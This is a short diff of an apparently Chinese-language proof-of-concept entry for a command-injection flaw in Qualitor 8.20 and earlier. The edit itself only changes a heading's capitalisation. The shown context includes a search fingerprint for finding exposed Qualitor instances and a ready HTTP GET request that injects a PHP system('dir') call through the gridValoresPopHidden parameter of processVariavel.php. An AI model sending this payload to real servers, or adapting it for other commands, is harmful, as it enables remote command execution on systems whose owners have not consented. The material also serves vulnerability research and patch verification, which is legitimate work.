@@ -8,7 +8,7 @@ Qualitor 8.20及之前版本存在命令注入漏洞,远程攻击者可利用该
 app="Qualitor-Web"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /html/ad/adpesquisasql/request/processVariavel.php?gridValoresPopHidden=echo%20system("dir"); HTTP/1.1
